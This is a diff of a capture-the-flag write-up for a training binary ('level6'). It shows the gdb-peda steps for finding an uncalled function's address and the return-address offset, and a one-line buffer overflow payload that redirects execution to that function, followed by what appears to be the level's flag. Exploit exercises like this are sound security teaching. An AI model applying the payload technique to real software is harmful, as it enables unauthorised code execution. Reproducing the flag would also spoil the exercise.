@@ -1,12 +1,17 @@
-In this level, we use the vulnaribility of the function strcpy to Buffer Overflow
-There is a function called n, which is not called and contains system function.
-We need the address of this function:
-gdb n
-0x8048454 <n>:	0x83e58955
+# we use the vulnaribility of the function strcpy to Buffer Overflow
+# there is a function called n, which is not called and contains system function.
+# we need the address of this function:
+gdb-peda$ info funct n
+[...]
+0x08048454  n
 
-The playload:
-To get the offset of the payload
-offset = 72
+# the playload offset :
+gdb-peda$ pattern create 100
+'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
+gdb-peda$ r 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
+gdb-peda$ pattern search
+EIP+0 found at offset: 72
+# offset = 72
 
 ./level6 $(python -c "print 'A' *72 + '\x54\x84\x04\x08'")
 f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
